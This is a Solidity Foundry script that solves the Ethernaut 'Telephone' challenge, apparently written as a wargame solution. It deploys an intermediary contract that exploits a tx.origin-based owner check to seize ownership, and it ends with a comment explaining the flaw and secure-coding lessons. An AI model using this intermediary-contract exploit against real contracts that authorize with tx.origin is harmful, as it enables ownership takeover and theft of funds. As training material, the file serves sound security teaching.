// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ethernaut/levels/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title TelephoneAttacker
 * @notice Intermediary contract to exploit the tx.origin vs msg.sender check
 */
contract TelephoneAttacker {
    // Function to call the changeOwner function of the Telephone contract
    function attack(Telephone telephoneInstance, address newOwner) public {
        // When this is called:
        // tx.origin = the player's address (who called the script)
        // msg.sender = this contract's address (when calling telephoneInstance)
        telephoneInstance.changeOwner(newOwner);
    }
}

/**
 * @title TelephoneSolver
 * @notice Script to solve the Telephone challenge
 * @dev Run with `forge script script/solutions/TelephoneSolver.s.sol:TelephoneSolver --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast`
 */
contract TelephoneSolver is Script {
    // Instance address - replace with your own if needed
    Telephone public telephoneInstance = Telephone(0xe8F96cE856B7410FDD2141b9F25F6C03344B726F);

    function setUp() public {
        // No setup required
    }

    function run() public {
        // Get player address from private key
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        
        console.log("Telephone instance address:", address(telephoneInstance));
        console.log("Player address:", player);
        console.log("Current owner:", telephoneInstance.owner());
        
        vm.startBroadcast(privateKey);

        // Step 1: Deploy the intermediary attacker contract
        console.log("Step 1: Deploying attacker contract...");
        TelephoneAttacker attacker = new TelephoneAttacker();
        
        // Step 2: Call the attack function which will trigger changeOwner
        console.log("Step 2: Executing attack to change ownership...");
        attacker.attack(telephoneInstance, player);

        vm.stopBroadcast();
        
        // Verify the result
        console.log("New owner:", telephoneInstance.owner());
        
        if (telephoneInstance.owner() == player) {
            console.log("Challenge completed successfully!");
        } else {
            console.log("Challenge not completed. The player is not the owner.");
        }
    }
}

/*
 * VULNERABILITY EXPLANATION
 * -----------------------
 * The Telephone contract has a vulnerability in the changeOwner function:
 *
 * ```solidity
 * function changeOwner(address _owner) public {
 *     if (tx.origin != msg.sender) {
 *         owner = _owner;
 *     }
 * }
 * ```
 *
 * This function checks if tx.origin is different from msg.sender, which creates a
 * security issue because:
 * 
 * - tx.origin: Always refers to the address that originally sent the transaction
 * - msg.sender: Refers to the immediate caller of the function
 *
 * EXPLOIT TECHNIQUE
 * -----------------------
 * We exploit this by creating an intermediary contract that calls the vulnerable function:
 * 
 * 1. Player calls TelephoneAttacker.attack()
 * 2. TelephoneAttacker calls Telephone.changeOwner()
 * 3. Inside Telephone.changeOwner():
 *    - tx.origin = Player's address (original transaction sender)
 *    - msg.sender = TelephoneAttacker's address (immediate caller)
 * 4. Since tx.origin ≠ msg.sender, the condition is met and ownership is transferred
 *
 * SECURITY LESSONS
 * -----------------------
 * Never use tx.origin for authorization purposes. Using tx.origin for authentication is
 * dangerous because it makes your contract vulnerable to phishing attacks.
 *
 * Instead:
 * - Use msg.sender for authorization checks
 * - Implement proper access control mechanisms
 * - Consider using OpenZeppelin's Ownable contracts for ownership management
 *
 * Additionally, understand the difference between tx.origin and msg.sender:
 * - tx.origin can be manipulated through intermediary contracts
 * - msg.sender is more reliable for verifying direct interactions
 */ 